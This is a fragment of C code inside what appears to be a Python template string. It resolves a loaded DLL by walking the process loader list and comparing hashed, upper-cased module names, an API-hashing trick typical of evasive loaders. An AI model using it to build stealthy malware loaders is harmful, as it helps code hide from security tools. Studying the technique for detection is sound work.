			UpperCaseDllName[i] = '\0';

			
			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);

		}}
		else {{
			break;
		}}

		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}}

	return NULL;
}}
"""
